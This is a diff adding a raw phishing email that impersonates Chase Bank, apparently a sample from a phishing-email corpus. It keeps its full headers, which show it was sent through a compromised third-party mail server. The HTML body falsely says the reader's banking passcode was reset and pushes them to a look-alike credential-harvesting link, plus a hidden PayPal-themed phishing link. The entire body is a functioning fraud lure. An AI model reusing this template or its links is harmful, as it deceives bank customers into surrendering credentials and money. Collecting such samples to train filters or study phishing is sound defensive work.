@@ -1,0 +1,101 @@
+Return-Path: belgrade@xmail.net
+Delivered-To: jose@monkey.org
+X-FDA: 71094497922.23.ear14_7d4c6b4d3fe18
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 30,2,0,c5a8110e07297e63,d41d8cd98f00b204,belgrade@xmail.net,,RULES_HIT:41:72:375:379:387:539:540:541:542:543:567:962:967:969:973:978:983:988:989:1155:1189:1208:1224:1254:1260:1263:1311:1313:1314:1381:1431:1437:1515:1516:1517:1534:1542:1587:1588:1589:1593:1594:1623:1631:1653:1685:1711:1730:1747:1777:1792:1803:2073:2076:2194:2199:2393:2525:2539:2543:2549:2553:2567:2610:2682:2685:2741:2859:2890:2891:2892:2894:2895:2900:2902:2909:2915:2922:2923:2924:2925:2926:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3352:3586:3865:3867:3868:3870:3871:3873:3874:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:5007:6248:6703:7557:7652:7774:7841:7903:7904:7976:8518:8550:8599:8603:8634:8987:9025:9388:9908:10004:10049:10346:11529:11658:11914:12043:12217:12295:12517:12519:12555:12764:12955:12958:13046:13095:13132:13139:13231:13975:14037:14194:14659:21251,0,RBL:85.10.55.3:@xmail.net:.lbl8.mailshell.net-62.22.110.100 64.201.201.201,CacheIP:none,Bayesian:0.5,0.5,
+X-HE-Tag: ear14_7d4c6b4d3fe18
+X-Filterd-Recvd-Size: 4141
+Received: from s20.hostingit.hr (s20.hostingit.hr [85.10.55.3])
+	by imf22.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Wed, 20 Jan 2016 00:47:40 +0000 (UTC)
+Received: from [217.108.212.249] (port=11645 helo=User)
+	by s20.hostingit.hr with esmtpa (Exim 4.86)
+	(envelope-from <belgrade@xmail.net>)
+	id 1aLgvb-00035a-Jf; Wed, 20 Jan 2016 01:47:16 +0100
+From: "Chase Bank"<belgrade@xmail.net>
+Subject: Your Online Banking Passcode Was Reset / kindly fill in all required fields
+Date: Wed, 20 Jan 2016 01:47:15 +0100
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2800.1081
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1081
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - s20.hostingit.hr
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - xmail.net
+X-Get-Message-Sender-Via: s20.hostingit.hr: authenticated_id: test@interpreta.hr
+X-Authenticated-Sender: s20.hostingit.hr: test@interpreta.hr
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 26
+
+<HTML><HEAD><TITLE></TITLE>
+</HEAD>
+<BODY bgcolor=#FFFFFF leftmargin=5 topmargin=5 rightmargin=5 bottommargin=5>
+<FONT size=2 color=#000000 face="Arial">
+<DIV>
+<FONT size=3 color=#808080><B>Dear Customer</B></FONT></DIV>
+<DIV>
+<FONT color=#808080>&nbsp;</FONT></DIV>
+<DIV>
+<FONT color=#808080>Your Online Banking Passcode was reset</FONT></DIV>
+<DIV>
+<FONT color=#808080>&nbsp;</FONT></DIV>
+<DIV>
+<FONT color=#808080>We're letting you know your Online Banking Passcode was reset on</FONT></DIV>
+<DIV>
+<FONT color=#808080>20/1/2016.</FONT></DIV>
+<DIV>
+<FONT color=#808080>&nbsp;</FONT></DIV>
+<DIV>
+<FONT color=#808080>This alert relates to your Online Banking profile,</FONT></DIV>
+<DIV>
+<FONT color=#808080>&nbsp;</FONT></DIV>
+<DIV>
+<FONT color=#808080>You can sign in to Online to verify your account by clicking the link below for verification purpose only.</FONT></DIV>
+<DIV>
+<FONT color=#808080>&nbsp;</FONT></DIV>
+<DIV>
+<A href="http://boyterstudio.com/chase/chase2015/chase"><FONT size=3 color=#0000FF><U>Confirm your </U></FONT></A><A href="http://boyterstudio.com/chase/chase2015/chase"><FONT size=3 color=#0000FF><U>information</U></FONT></A></DIV>
+<DIV>
+<A href="http://ninefivemedia.com/paypal-upates/Update/index.php"><FONT size=3 color=#0000FF><B><U>&nbsp;</B></U></FONT></A></DIV>
+<DIV>
+<FONT color=#808080><B>Link not working?</B></FONT><FONT color=#C0C0C0> Copy and paste the one below into your browser: </FONT></DIV>
+<DIV>
+<FONT color=#0000FF>http://boyterstudio.com/chase/chase2015/chase new style/home/index.html</FONT></DIV>
+<DIV>
+<FONT color=#808080>&nbsp;</FONT></DIV>
+<DIV>
+<FONT color=#808080>This is a service email from Chase Bank and Co. Please note that you may</FONT></DIV>
+<DIV>
+<FONT color=#808080>receive service emails in accordance with your Chase Banks service</FONT></DIV>
+<DIV>
+<FONT color=#808080>agreements, whether or not you elect to receive promotional email.</FONT></DIV>
+<DIV>
+<FONT color=#000000><B>&nbsp;</B></FONT></DIV>
+<DIV>
+<FONT color=#808080><B>Chase.com l </B></FONT><A href="https://www.suntrust.com/Privacy"><FONT color=#808080><B><U>Privacy</B></U></FONT></A><FONT color=#808080><B>, </B></FONT><FONT color=#808080><B><U>Security</B></U></FONT><FONT color=#808080><B> &amp; </B></FONT><FONT color=#808080><B><U>Fraud</B></U></FONT><FONT color=#808080><B>&nbsp; </B></FONT><FONT color=#000000><B> </B></FONT></DIV>
+<DIV>
+<FONT color=#0000FF>&nbsp;</FONT></DIV>
+<DIV>
+<FONT color=#808080>Please don't reply directly to this automatically generated email</FONT></DIV>
+<DIV>
+<FONT color=#808080>message.</FONT></DIV>
+<DIV>
+<FONT color=#808080>&nbsp;</FONT></DIV>
+<DIV>
+<FONT color=#808080>&nbsp;</FONT></DIV>
+<DIV>
+<FONT color=#000000><B>©</B></FONT><FONT color=#808080> 2016 Chase and Co. All rights reserved</FONT></DIV>
+<DIV>
+<FONT color=#808080>&nbsp;</FONT></DIV>
+</FONT>
+</BODY></HTML>
